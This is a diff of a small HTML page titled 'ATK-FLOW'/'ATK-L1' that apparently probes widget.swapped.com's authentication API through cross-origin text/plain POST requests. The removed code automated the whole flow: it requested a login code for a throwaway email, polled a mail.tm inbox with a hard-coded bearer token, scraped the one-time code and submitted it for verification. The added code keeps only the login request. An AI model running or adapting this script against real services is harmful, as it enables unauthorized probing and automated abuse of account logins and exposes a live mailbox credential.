@@ -1,46 +1,20 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-FLOW</title></head>
-<body><pre id="out">STARTING</pre><pre id="out2"></pre>
+<html><head><meta charset="utf-8"><title>ATK-L1</title></head>
+<body><pre id="out">L-START</pre>
 <script>
 (async () => {
-  const log = (s) => { document.getElementById("out").textContent += "\n" + s; };
-  const EMAIL = "clean1795767360@euploading.com";
-  const MT = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3OTU3NjczNjMsInJvbGVzIjpbIlJPTEVfVVNFUiJdLCJhZGRyZXNzIjoiY2xlYW4xNzk1NzY3MzYwQGV1cGxvYWRpbmcuY29tIiwiaWQiOiI2YjA5M2M0MTZiNGFjYWQ3YTcwYTQzNDQiLCJtZXJjdXJlIjp7InN1YnNjcmliZSI6WyIvYWNjb3VudHMvNmIwOTNjNDE2YjRhY2FkN2E3MGE0MzQ0Il19fQ.4u2s5c2T0BwmBzrpGtF-e32SXtt6NGvxFglhI2qa8v6NwJZSIaPXO-21X5BaLmObJmyYnDZk_qzyMK7bwv-Jlg";
   try {
     const lr = await fetch("https://widget.swapped.com/api/v1/auth/login", {
       method: "POST",
       headers: { "Content-Type": "text/plain" },
-      body: JSON.stringify({ email: EMAIL, url: "https://widget.swapped.com/" })
+      body: JSON.stringify({ email: "clean1795767360@euploading.com", url: "https://widget.swapped.com/" })
     });
-    log("login: " + lr.status + " " + (await lr.text()).slice(0, 100));
-    let code = null;
-    for (let i = 0; i < 25 && !code; i++) {
-      await new Promise(r => setTimeout(r, 4000));
-      try {
-        const g = await fetch("https://api.mail.tm/messages", { headers: { "Authorization": "Bearer " + MT } });
-        const j = await g.json();
-        const total = j["hydra:totalItems"];
-        log("poll " + i + ": mails=" + total);
-        if (total > 0) {
-          const mid = j["hydra:member"][0].id;
-          const det = await fetch("https://api.mail.tm/messages/" + mid, { headers: { "Authorization": "Bearer " + MT } });
-          const dj = await det.json();
-          const html = Array.isArray(dj.html) ? dj.html.join("") : (dj.html || "");
-          const idx = html.indexOf("Your login code is");
-          const spans = (html.slice(idx, idx + 1500).match(/<span[^>]*>([^<]+)<\/span>/g) || []).map(s => s.replace(/<[^>]+>/g, ""));
-          code = (spans[0] || "") + (spans[1] || "");
-        }
-      } catch (e) { log("poll err: " + e.message); }
-    }
-    if (!code) { log("NO CODE"); return; }
-    log("CODE: " + code);
-    const vr = await fetch("https://widget.swapped.com/api/v1/auth/verify", {
-      method: "POST",
-      headers: { "Content-Type": "text/plain" },
-      body: JSON.stringify({ email: EMAIL, token: code })
-    });
-    log("verify: " + vr.status);
-    document.getElementById("out2").textContent = (await vr.text()).slice(0, 500);
-  } catch (e) { log("ERR: " + e.message); }
+    const t = await lr.text();
+    document.getElementById("out").textContent = "L-RESULT " + lr.status + " :: " + t.slice(0, 200);
+    document.title = "ATK-L1-" + lr.status;
+  } catch (e) {
+    document.getElementById("out").textContent = "L-ERR " + e.message;
+    document.title = "ATK-L1-ERR";
+  }
 })();
 </script></body></html>
